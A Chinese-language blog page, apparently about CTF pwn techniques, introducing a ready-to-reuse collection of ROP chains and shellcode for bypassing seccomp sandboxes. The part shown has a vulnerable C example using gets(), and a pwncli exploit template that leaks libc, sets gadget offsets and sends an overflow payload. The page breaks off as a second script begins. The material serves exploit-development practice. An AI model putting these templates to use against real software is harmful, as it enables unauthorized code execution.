<!DOCTYPE html>
<html lang="zh-CN">

  <head>
    <!-- General meta -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    

    
      <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>seccomp沙盒绕过 | Liyck的技术博客</title>
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="seccomp沙盒绕过" />
<meta name="author" content="Liyck" />
<meta property="og:locale" content="zh_CN" />
<meta name="description" content="开始吧，我的blog" />
<meta property="og:description" content="开始吧，我的blog" />
<link rel="canonical" href="https://liyckonline.top/%E6%8A%80%E6%9C%AF/2025/08/01/my-second-post/" />
<meta property="og:url" content="https://liyckonline.top/%E6%8A%80%E6%9C%AF/2025/08/01/my-second-post/" />
<meta property="og:site_name" content="Liyck的技术博客" />
<meta property="og:image" content="https://picsum.photos/2560/600?image=733" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-08-01T10:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://picsum.photos/2560/600?image=733" />
<meta property="twitter:title" content="seccomp沙盒绕过" />
<script type="application/ld+json">
{"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://liyckonline.top/%E6%8A%80%E6%9C%AF/2025/08/01/my-second-post/"},"description":"开始吧，我的blog","author":{"@type":"Person","name":"Liyck"},"url":"https://liyckonline.top/%E6%8A%80%E6%9C%AF/2025/08/01/my-second-post/","image":"https://picsum.photos/2560/600?image=733","headline":"seccomp沙盒绕过","dateModified":"2025-08-01T10:00:00+08:00","datePublished":"2025-08-01T10:00:00+08:00","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

    
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
      
    

    <link rel="manifest" href="/manifest.json">
    <meta name="theme-color" content="#242e2b"/>

    
      <link rel="stylesheet" href="/assets/styles.css">
    

    

    

    
    
        <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;700&family=JetBrains+Mono:wght@400;700&display=swap" />
        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" media="print" onload="this.media='all'" />
    
    <noscript>
        
            <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
        
    </noscript>



    <!-- Overwrite this file with code you want before the closing head tag -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">


  </head>

  <body class="layout-post  seccomp沙盒绕过">
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="height: 0; position: absolute">
  <symbol id="codepen" viewBox="0 0 16 16"><path d="M15.988 5.443c-.004-.02-.007-.04-.012-.058l-.01-.033c-.006-.017-.012-.034-.02-.05-.003-.012-.01-.023-.014-.034l-.023-.045-.02-.032-.03-.04-.024-.03c-.01-.013-.022-.026-.034-.038l-.027-.027-.04-.032-.03-.024-.012-.01L8.38.117c-.23-.155-.53-.155-.76 0L.305 4.99.296 5c-.012.007-.022.015-.032.023-.014.01-.027.02-.04.032l-.027.027-.034.037-.024.03-.03.04c-.006.012-.013.022-.02.033l-.023.045-.015.034c-.007.016-.012.033-.018.05l-.01.032c-.005.02-.01.038-.012.058l-.006.03C.002 5.5 0 5.53 0 5.56v4.875c0 .03.002.06.006.09l.007.03c.003.02.006.04.013.058l.01.033c.006.018.01.035.018.05l.015.033c.006.016.014.03.023.047l.02.03c.008.016.018.03.03.042.007.01.014.02.023.03.01.012.02.025.034.036.01.01.018.02.028.026l.04.033.03.023.01.01 7.31 4.876c.116.078.248.117.382.116.134 0 .266-.04.38-.116l7.314-4.875.01-.01c.012-.007.022-.015.032-.023.014-.01.027-.02.04-.032l.027-.027.034-.037.024-.03.03-.04.02-.032.023-.046.015-.033.018-.052.01-.033c.005-.02.01-.038.013-.058 0-.01.003-.02.004-.03.004-.03.006-.06.006-.09V5.564c0-.03-.002-.06-.006-.09l-.007-.03zM8 9.626L5.568 8 8 6.374 10.432 8 8 9.626zM7.312 5.18l-2.98 1.993-2.406-1.61 5.386-3.59v3.206zM3.095 8l-1.72 1.15v-2.3L3.095 8zm1.237.828l2.98 1.993v3.208l-5.386-3.59 2.406-1.61zm4.355 1.993l2.98-1.993 2.407 1.61-5.387 3.59v-3.206zM12.905 8l1.72-1.15v2.3L12.905 8zm-1.237-.827L8.688 5.18V1.97l5.386 3.59-2.406 1.61z" fill-rule="nonzero"/></symbol>
  <symbol id="dribbble" viewBox="0 0 16 16"><path d="M8 16c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm6.747-6.905c-.234-.074-2.115-.635-4.257-.292.894 2.456 1.258 4.456 1.328 4.872 1.533-1.037 2.624-2.68 2.93-4.58zM10.67 14.3c-.102-.6-.5-2.688-1.46-5.18l-.044.014C5.312 10.477 3.93 13.15 3.806 13.4c1.158.905 2.614 1.444 4.194 1.444.947 0 1.85-.194 2.67-.543zm-7.747-1.72c.155-.266 2.03-3.37 5.555-4.51.09-.03.18-.056.27-.08-.173-.39-.36-.778-.555-1.16C4.78 7.85 1.47 7.807 1.17 7.8l-.003.208c0 1.755.665 3.358 1.756 4.57zM1.31 6.61c.307.005 3.122.017 6.318-.832-1.132-2.012-2.353-3.705-2.533-3.952-1.912.902-3.34 2.664-3.784 4.785zM6.4 1.368c.188.253 1.43 1.943 2.548 4 2.43-.91 3.46-2.293 3.582-2.468C11.323 1.827 9.736 1.176 8 1.176c-.55 0-1.087.066-1.6.19zm6.89 2.322c-.145.194-1.29 1.662-3.816 2.694.16.325.31.656.453.99.05.117.1.235.147.352 2.274-.286 4.533.172 4.758.22-.015-1.613-.59-3.094-1.543-4.257z"/></symbol>
  <symbol id="designernews" viewBox="0 0 16 16"><path d="M7.514 7.988c0-2.555-1.57-4.287-4.56-4.287H0v8.6h3.016c2.903 0 4.498-1.75 4.498-4.31zM5.37 8c0 1.844-.946 2.642-2.467 2.642H2.13V5.358h.773C4.36 5.358 5.37 6.193 5.37 8zM16 12.3V3.7h-1.98v4.81L10.853 3.7h-2.07v8.6h1.982V7.152l3.39 5.146H16z"/></symbol>
  <symbol id="facebook" viewBox="0 0 16 16"><path d="M15.117 0H.883C.395 0 0 .395 0 .883v14.234c0 .488.395.883.883.883h7.663V9.804H6.46V7.39h2.086V5.607c0-2.066 1.262-3.19 3.106-3.19.883 0 1.642.064 1.863.094v2.16h-1.28c-1 0-1.195.476-1.195 1.176v1.54h2.39l-.31 2.416h-2.08V16h4.077c.488 0 .883-.395.883-.883V.883C16 .395 15.605 0 15.117 0" fill-rule="nonzero"/></symbol>
  <symbol id="flickr" viewBox="0 0 16 16"><path d="M0 8c0 2.05 1.662 3.71 3.71 3.71 2.05 0 3.713-1.66 3.713-3.71S5.76 4.29 3.71 4.29C1.663 4.29 0 5.95 0 8zm8.577 0c0 2.05 1.662 3.71 3.712 3.71C14.337 11.71 16 10.05 16 8s-1.662-3.71-3.71-3.71c-2.05 0-3.713 1.66-3.713 3.71z"/></symbol>
  <symbol id="github" viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.582 0 8c0 3.535 2.292 6.533 5.47 7.59.4.075.547-.172.547-.385 0-.19-.007-.693-.01-1.36-2.226.483-2.695-1.073-2.695-1.073-.364-.924-.89-1.17-.89-1.17-.725-.496.056-.486.056-.486.803.056 1.225.824 1.225.824.714 1.223 1.873.87 2.33.665.072-.517.278-.87.507-1.07-1.777-.2-3.644-.888-3.644-3.953 0-.873.31-1.587.823-2.147-.083-.202-.358-1.015.077-2.117 0 0 .672-.215 2.2.82.638-.178 1.323-.266 2.003-.27.68.004 1.364.092 2.003.27 1.527-1.035 2.198-.82 2.198-.82.437 1.102.163 1.915.08 2.117.513.56.823 1.274.823 2.147 0 3.073-1.87 3.75-3.653 3.947.287.246.543.735.543 1.48 0 1.07-.01 1.933-.01 2.195 0 .215.144.463.55.385C13.71 14.53 16 11.534 16 8c0-4.418-3.582-8-8-8"/></symbol>
  <symbol id="hackernews" viewBox="0 0 16 16"><path d="M0 0v16h16V0H0zm8.92 8.96v3H7.25v-3l-2.75-5h1.96l1.66 3.48L9.7 3.96h1.88l-2.66 5z"/></symbol>
  <symbol id="instagram" viewBox="0 0 16 16"><path d="M8 0C5.827 0 5.555.01 4.702.048 3.85.088 3.27.222 2.76.42c-.526.204-.973.478-1.417.923-.445.444-.72.89-.923 1.417-.198.51-.333 1.09-.372 1.942C.008 5.555 0 5.827 0 8s.01 2.445.048 3.298c.04.852.174 1.433.372 1.942.204.526.478.973.923 1.417.444.445.89.72 1.417.923.51.198 1.09.333 1.942.372.853.04 1.125.048 3.298.048s2.445-.01 3.298-.048c.852-.04 1.433-.174 1.942-.372.526-.204.973-.478 1.417-.923.445-.444.72-.89.923-1.417.198-.51.333-1.09.372-1.942.04-.853.048-1.125.048-3.298s-.01-2.445-.048-3.298c-.04-.852-.174-1.433-.372-1.942-.204-.526-.478-.973-.923-1.417-.444-.445-.89-.72-1.417-.923-.51-.198-1.09-.333-1.942-.372C10.445.008 10.173 0 8 0zm0 1.44c2.136 0 2.39.01 3.233.048.78.036 1.203.166 1.485.276.374.145.64.318.92.598.28.28.453.546.598.92.11.282.24.705.276 1.485.038.844.047 1.097.047 3.233s-.01 2.39-.048 3.233c-.036.78-.166 1.203-.276 1.485-.145.374-.318.64-.598.92-.28.28-.546.453-.92.598-.282.11-.705.24-1.485.276-.844.038-1.097.047-3.233.047s-2.39-.01-3.233-.048c-.78-.036-1.203-.166-1.485-.276-.374-.145-.64-.318-.92-.598-.28-.28-.453-.546-.598-.92-.11-.282-.24-.705-.276-1.485C1.45 10.39 1.44 10.136 1.44 8s.01-2.39.048-3.233c.036-.78.166-1.203.276-1.485.145-.374.318-.64.598-.92.28-.28.546-.453.92-.598.282-.11.705-.24 1.485-.276C5.61 1.45 5.864 1.44 8 1.44zm0 2.452c-2.27 0-4.108 1.84-4.108 4.108 0 2.27 1.84 4.108 4.108 4.108 2.27 0 4.108-1.84 4.108-4.108 0-2.27-1.84-4.108-4.108-4.108zm0 6.775c-1.473 0-2.667-1.194-2.667-2.667 0-1.473 1.194-2.667 2.667-2.667 1.473 0 2.667 1.194 2.667 2.667 0 1.473-1.194 2.667-2.667 2.667zm5.23-6.937c0 .53-.43.96-.96.96s-.96-.43-.96-.96.43-.96.96-.96.96.43.96.96z"/></symbol>
  <symbol id="linkedin" viewBox="0 0 16 16"><path d="M13.632 13.635h-2.37V9.922c0-.886-.018-2.025-1.234-2.025-1.235 0-1.424.964-1.424 1.96v3.778h-2.37V6H8.51V7.04h.03c.318-.6 1.092-1.233 2.247-1.233 2.4 0 2.845 1.58 2.845 3.637v4.188zM3.558 4.955c-.762 0-1.376-.617-1.376-1.377 0-.758.614-1.375 1.376-1.375.76 0 1.376.617 1.376 1.375 0 .76-.617 1.377-1.376 1.377zm1.188 8.68H2.37V6h2.376v7.635zM14.816 0H1.18C.528 0 0 .516 0 1.153v13.694C0 15.484.528 16 1.18 16h13.635c.652 0 1.185-.516 1.185-1.153V1.153C16 .516 15.467 0 14.815 0z" fill-rule="nonzero"/></symbol>
  <symbol id="medium" viewBox="0 0 16 16"><path d="M11.824 12.628l-.276.45.798.398 2.744 1.372c.15.076.294.11.418.11.278 0 .467-.177.467-.492V5.883l-4.15 6.745zm4.096-8.67c-.004-.003 0-.01-.003-.012l-4.825-2.412c-.06-.03-.123-.038-.187-.044-.016 0-.03-.01-.047-.01-.184 0-.368.092-.467.254l-.24.39-.5.814-1.89 3.08 1.89 3.076.5.813.5.812.59.95 4.71-7.64c.02-.03.01-.06-.02-.08zm-6.27 7.045L7.17 6.97l-.295-.477-.294-.477-.25-.416v4.867l3.32 1.663.5.25.5.25-.5-.813-.5-.813zM.737 1.68L.59 1.608c-.085-.042-.166-.062-.24-.062-.206 0-.35.16-.35.427v10.162c0 .272.2.594.442.716l4.145 2.08c.107.06.208.08.3.08.257 0 .438-.2.438-.53V4.01c0-.02-.012-.04-.03-.047L.738 1.68z"/></symbol>
  <symbol id="pinterest" viewBox="0 0 16 16"><path d="M8 0C3.582 0 0 3.582 0 8c0 3.39 2.108 6.285 5.084 7.45-.07-.633-.133-1.604.028-2.295.146-.625.938-3.977.938-3.977s-.24-.48-.24-1.188c0-1.11.646-1.943 1.448-1.943.683 0 1.012.513 1.012 1.127 0 .687-.436 1.713-.662 2.664-.19.797.4 1.445 1.185 1.445 1.42 0 2.514-1.498 2.514-3.662 0-1.915-1.376-3.254-3.342-3.254-2.276 0-3.61 1.707-3.61 3.472 0 .687.263 1.424.593 1.825.066.08.075.15.057.23-.06.252-.196.796-.223.907-.035.146-.115.178-.268.107-.998-.465-1.624-1.926-1.624-3.1 0-2.524 1.834-4.84 5.287-4.84 2.774 0 4.932 1.977 4.932 4.62 0 2.757-1.74 4.977-4.153 4.977-.81 0-1.572-.422-1.833-.92l-.5 1.902c-.18.695-.667 1.566-.994 2.097.75.232 1.545.357 2.37.357 4.417 0 8-3.582 8-8s-3.583-8-8-8z" fill-rule="nonzero"/></symbol>
  <symbol id="rss" viewBox="0 0 16 16"><path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194 11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.985 2.194-2.196 2.194C.984 16 0 15.017 0 13.806c0-1.21.983-2.195 2.194-2.195zM10.606 16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"/></symbol>
  <symbol id="reddit" viewBox="0 0 16 16"><path d="M1.473 9.368c-.04.185-.06.374-.06.566 0 2.3 2.94 4.173 6.554 4.173 3.613 0 6.553-1.872 6.553-4.173 0-.183-.02-.364-.055-.54l-.01-.022c-.013-.036-.02-.073-.02-.11-.2-.784-.745-1.497-1.533-2.072-.03-.01-.058-.026-.084-.047-.017-.013-.03-.028-.044-.043-1.198-.824-2.91-1.34-4.807-1.34-1.88 0-3.576.506-4.772 1.315-.01.012-.02.023-.033.033-.026.022-.056.04-.087.05-.805.576-1.364 1.293-1.572 2.086 0 .038-.01.077-.025.114l-.005.01zM8 13.003c-1.198 0-2.042-.26-2.58-.8-.116-.116-.116-.305 0-.422.117-.11.307-.11.424 0 .42.42 1.125.63 2.155.63 1.03 0 1.73-.2 2.15-.62.11-.11.3-.11.42 0 .11.12.11.31 0 .43-.54.54-1.38.8-2.58.8zM5.592 7.945c-.61 0-1.12.51-1.12 1.12 0 .608.51 1.102 1.12 1.102.61 0 1.103-.494 1.103-1.102 0-.61-.494-1.12-1.103-1.12zm4.83 0c-.61 0-1.12.51-1.12 1.12 0 .608.51 1.102 1.12 1.102.61 0 1.103-.494 1.103-1.102 0-.61-.494-1.12-1.103-1.12zM13.46 6.88c.693.556 1.202 1.216 1.462 1.94.3-.225.48-.578.48-.968 0-.67-.545-1.214-1.214-1.214-.267 0-.52.087-.728.243zM1.812 6.64c-.67 0-1.214.545-1.214 1.214 0 .363.16.7.43.927.268-.72.782-1.37 1.478-1.92-.202-.14-.443-.22-.694-.22zm6.155 8.067c-3.944 0-7.152-2.14-7.152-4.77 0-.183.016-.363.046-.54-.53-.33-.86-.91-.86-1.545 0-1 .82-1.812 1.82-1.812.45 0 .87.164 1.2.455 1.24-.796 2.91-1.297 4.75-1.33l1.21-3.69.27.063s.01 0 .01.002l2.82.663c.23-.533.76-.908 1.38-.908.82 0 1.49.67 1.49 1.492 0 .823-.67 1.492-1.49 1.492s-1.49-.67-1.49-1.49L9.4 2.18l-.98 2.99c1.77.07 3.37.57 4.57 1.35.33-.31.764-.48 1.225-.48 1 0 1.814.81 1.814 1.81 0 .66-.36 1.26-.92 1.58.02.17.04.33.04.5-.01 2.63-3.21 4.77-7.16 4.77zM13.43 1.893c-.494 0-.895.4-.895.894 0 .493.4.894.894.894.49 0 .89-.4.89-.89s-.4-.89-.9-.89z"/></symbol>
  <symbol id="skype" viewBox="0 0 16 16"><path d="M8.035 12.6c-2.685 0-3.885-1.322-3.885-2.313 0-.51.374-.865.89-.865 1.15 0 .85 1.653 2.995 1.653 1.096 0 1.703-.597 1.703-1.208 0-.368-.18-.775-.904-.954l-2.387-.597C4.524 7.833 4.175 6.79 4.175 5.812c0-2.034 1.91-2.798 3.704-2.798 1.65 0 3.6.916 3.6 2.136 0 .523-.452.827-.97.827-.98 0-.798-1.36-2.773-1.36-.98 0-1.523.444-1.523 1.08 0 .636.774.84 1.446.993l1.767.392c1.936.433 2.427 1.566 2.427 2.633 0 1.652-1.266 2.886-3.82 2.886m7.4-3.264l-.014.084-.028-.16c.015.024.028.05.042.076.082-.45.125-.912.125-1.373 0-1.023-.2-2.014-.595-2.948-.38-.902-.925-1.712-1.62-2.407-.692-.696-1.5-1.242-2.4-1.623C10.015.59 9.025.39 8.005.39c-.48 0-.963.045-1.43.135H6.57l.08.04-.16-.023.08-.016C5.927.183 5.205 0 4.472 0 3.278 0 2.155.466 1.31 1.313.465 2.16 0 3.286 0 4.483c0 .763.195 1.512.563 2.175l.013-.083.028.16c-.015-.026-.027-.052-.04-.077-.076.43-.115.867-.115 1.305 0 1.022.2 2.014.593 2.948.38.903.925 1.713 1.62 2.408.693.695 1.5 1.242 2.4 1.623.932.397 1.92.597 2.94.597.445 0 .89-.04 1.325-.118l-.077-.043.162.028-.084.014c.67.378 1.426.58 2.2.58 1.194 0 2.317-.466 3.162-1.313.845-.846 1.31-1.972 1.31-3.17 0-.765-.197-1.517-.566-2.18" fill-rule="nonzero"/></symbol>
  <symbol id="tumblr" viewBox="0 0 16 16"><path d="M9.708 16c-3.396 0-4.687-2.504-4.687-4.274V6.498H3.403V4.432C5.83 3.557 6.412 1.368 6.55.12c.01-.086.077-.12.115-.12H9.01v4.076h3.2v2.422H8.997v4.98c.01.667.25 1.58 1.472 1.58h.067c.424-.012.994-.136 1.29-.278l.77 2.283c-.288.424-1.594.916-2.77.936h-.12z" fill-rule="nonzero"/></symbol>
  <symbol id="twitch" viewBox="0 0 16 16"><g fill-rule="nonzero"><path d="M1.393 0L.35 2.783v11.13h3.824V16h2.088l2.085-2.088h3.13L15.65 9.74V0H1.394zm1.39 1.39H14.26v7.653l-2.435 2.435H8l-2.085 2.085v-2.085H2.783V1.39z"/><path d="M6.61 8.348H8V4.175H6.61v4.173zm3.824 0h1.39V4.175h-1.39v4.173z"/></g></symbol>
  <symbol id="twitter" viewBox="0 0 16 16"><path d="M16 3.038c-.59.26-1.22.437-1.885.517.677-.407 1.198-1.05 1.443-1.816-.634.375-1.337.648-2.085.795-.598-.638-1.45-1.036-2.396-1.036-1.812 0-3.282 1.468-3.282 3.28 0 .258.03.51.085.75C5.152 5.39 2.733 4.084 1.114 2.1.83 2.583.67 3.147.67 3.75c0 1.14.58 2.143 1.46 2.732-.538-.017-1.045-.165-1.487-.41v.04c0 1.59 1.13 2.918 2.633 3.22-.276.074-.566.114-.865.114-.21 0-.416-.02-.617-.058.418 1.304 1.63 2.253 3.067 2.28-1.124.88-2.54 1.404-4.077 1.404-.265 0-.526-.015-.783-.045 1.453.93 3.178 1.474 5.032 1.474 6.038 0 9.34-5 9.34-9.338 0-.143-.004-.284-.01-.425.64-.463 1.198-1.04 1.638-1.7z" fill-rule="nonzero"/></symbol>
  <symbol id="vimeo" viewBox="0 0 16 16"><path d="M15.992 4.275c-.07 1.56-1.16 3.697-3.263 6.41-2.176 2.832-4.017 4.248-5.522 4.248-.933 0-1.722-.862-2.367-2.588L3.55 7.6c-.48-1.724-.993-2.587-1.542-2.587-.12 0-.538.252-1.255.755L0 4.796C.79 4.1 1.568 3.406 2.335 2.71c1.053-.912 1.844-1.39 2.37-1.44 1.246-.12 2.012.733 2.3 2.56.31 1.97.526 3.194.647 3.673.36 1.634.754 2.45 1.185 2.45.335 0 .838-.53 1.51-1.59.67-1.06 1.028-1.866 1.076-2.42.096-.915-.263-1.374-1.077-1.374-.383 0-.778.087-1.185.262.788-2.58 2.29-3.834 4.508-3.762 1.644.048 2.42 1.116 2.324 3.205z" fill-rule="nonzero"/></symbol>
  <symbol id="youtube" viewBox="0 0 16 16"><path d="M0 7.345c0-1.294.16-2.59.16-2.59s.156-1.1.636-1.587c.608-.637 1.408-.617 1.764-.684C3.84 2.36 8 2.324 8 2.324s3.362.004 5.6.166c.314.038.996.04 1.604.678.48.486.636 1.588.636 1.588S16 6.05 16 7.346v1.258c0 1.296-.16 2.59-.16 2.59s-.156 1.102-.636 1.588c-.608.638-1.29.64-1.604.678-2.238.162-5.6.166-5.6.166s-4.16-.037-5.44-.16c-.356-.067-1.156-.047-1.764-.684-.48-.487-.636-1.587-.636-1.587S0 9.9 0 8.605v-1.26zm6.348 2.73V5.58l4.323 2.255-4.32 2.24h-.002z"/></symbol>
  <symbol id="link" viewBox="0 0 16 16"><path d="M5.86 12.7l-.81.8c-.7.7-1.84.7-2.54 0a1.75 1.75 0 0 1 0-2.5l2.98-2.96c.61-.61 1.77-1.52 2.62-.68a1 1 0 1 0 1.4-1.4c-1.44-1.43-3.57-1.17-5.42.67L1.1 9.6a3.72 3.72 0 0 0 0 5.32 3.78 3.78 0 0 0 5.34 0l.8-.8a1 1 0 1 0-1.39-1.42zm9.03-11.5c-1.55-1.53-3.7-1.6-5.14-.19l-1 1a1 1 0 1 0 1.39 1.41l1-1c.75-.74 1.72-.43 2.35.2a1.75 1.75 0 0 1 0 2.5l-3.17 3.15c-1.46 1.45-2.14.77-2.43.48a1 1 0 0 0-1.4 1.4c.67.67 1.43 1 2.23 1 .98 0 2.01-.5 3-1.47l3.17-3.15a3.72 3.72 0 0 0 0-5.32z"/></symbol>
  <symbol id="email" viewBox="0 0 16 11"><path fill-rule="evenodd" d="M1.33 0h13.34L8 5 1.33 0zM16 0v11H0V0l8 6 8-6z"/></symbol>
  <symbol id="nav" viewBox="0 0 16 11"><path d="M0 12h16v-2H0v2zm0-5h16V5H0v2zm0-7v2h16V0H0z"/></symbol>
</svg>


    <header class="header">
  <div class="container">
    

    
<nav class="nav  nav--header">
  <ul class="list  list--nav">
    

      

      <li class="item  item--nav">
        <a href="/">首页</a>
      </li>
    

      

      <li class="item  item--nav">
        <a href="/blog/">博客</a>
      </li>
    

      

      <li class="item  item--nav">
        <a href="/categories/">分类</a>
      </li>
    

      

      <li class="item  item--nav">
        <a href="/projects/">项目</a>
      </li>
    

      

      <li class="item  item--nav">
        <a href="/about/">关于</a>
      </li>
    

      

      <li class="item  item--nav">
        <a href="/search/">搜索</a>
      </li>
    
  </ul>
  <button class="button  button--nav" aria-label="Menu toggle">
    <svg width="16" height="16" class="icon  icon--nav" role="img" alt="Menu"><title>Menu</title><use xlink:href="#nav" fill="CurrentColor"></use></svg>

  </button>
</nav>


<script type="text/javascript">
  // Get list and button
  const navList = document.querySelector('.header .list--nav')
  const button  = document.querySelector('.header .button--nav')

  // Hide nav and apply toggle
  const collapseNav = () => {
    if (document.body.clientWidth < 640) {
      navList.style.setProperty('--listHeight', `-${navList.offsetHeight}px`)
    } else {
      navList.removeAttribute('style')
    }

    button.onclick = () => {
      navList.style.setProperty('transition', `margin .1s`)
      if (navList.style.getPropertyValue('--listHeight')) {
        navList.style.removeProperty('--listHeight')
      } else {
        navList.style.setProperty('--listHeight', `-${navList.offsetHeight}px`)
      }
    }
  }

  collapseNav()

  // Check on resize if to collapse nav
  window.addEventListener('resize', () => {
    collapseNav()
  })
</script>

  </div>

  




  <div class="feature" style="background-image: url(https://picsum.photos/2560/600?image=733)">
    <div class="container  typeset">
      <h2 id="liyck">Liyck</h2>
<p>“你的情有独钟只能对值得的人持有”</p>

    </div>
  </div>



</header>


<main class="main  container">

  <article class="article  article--post  content  typeset">

    <h1>seccomp沙盒绕过</h1>
    

<small class="small  post-meta">
  
  
    
      <span class="label  label--category"><a href="/categories/#技术">技术</a></span>
    
  &nbsp;&middot;&nbsp;<time datetime="2025-08-01T10:00:00+08:00" class="time">2025年8月1日</time>
</small>

    <h1 id="seccomp沙盒绕过-rop与shellcode集合">seccomp沙盒绕过 (rop与shellcode集合)</h1>

<h2 id="前言">前言</h2>

<h3 id="起因">起因</h3>

<p>在每次遇到沙盒时都要重新写rop或者shellcode，这非常不健康，所以我写了这篇文章，尽可能的让这里的代码能拿来就能用。</p>

<p>在正篇里将直接用rop或shellcode中使用的函数进行命名，这样可以快速并清晰的找到要用的代码。</p>

<p><strong>注意: open+read+write为模版，之后相对应的代码可以直接进行替换，比如pread64可以直接将read进行替换（活字印刷术）。</strong></p>

<p>以下为例题程序</p>

<blockquote>
  <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre><span class="cp"># rop对应程序
</span><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
<span class="kt">char</span> <span class="n">v4</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"%lp</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">printf</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
<span class="n">gets</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp"># python3脚本
</span><span class="n">from</span> <span class="n">pwncli</span> <span class="n">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="err">'</span><span class="n">amd64</span><span class="err">'</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="err">'</span><span class="n">linux</span><span class="err">'</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="err">'</span><span class="n">debug</span><span class="err">'</span><span class="p">)</span>
<span class="n">p</span>   <span class="o">=</span> <span class="n">lambda</span> <span class="n">s</span><span class="p">,</span><span class="n">t</span><span class="o">:</span> <span class="n">print</span><span class="p">(</span><span class="n">f</span><span class="s">"</span><span class="se">\033</span><span class="s">[0;31;43m{s.ljust(15, ' ') + '-------------------------&gt;' + hex(t)}</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">)</span>

<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./rop"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="p">)</span>

<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">eval</span><span class="p">(</span><span class="n">sh</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"printf"</span><span class="p">]</span>

<span class="cp"># ---------需要更改
</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x000000000002a3e5</span>
<span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000163f88</span>
<span class="n">pop_rdx_r12</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x000000000011f2e7</span>
<span class="n">pop_rcx</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x000000000003d1ee</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="p">[</span><span class="n">rop</span><span class="err">程序</span><span class="p">]</span>  <span class="err">#</span> <span class="o">------</span>
<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>

<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<blockquote>
  <p><img src="/assets/image/2025-08-01-my-second-post.assets/3458477-20250416202250958-426312344.png" alt="image" /></p>
</blockquote>

<blockquote>
  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c1"># python3脚本
</span><span class="kn">from</span> <span class="n">pwncli</span> <span class="kn">import</span> <span class="o">*</span>
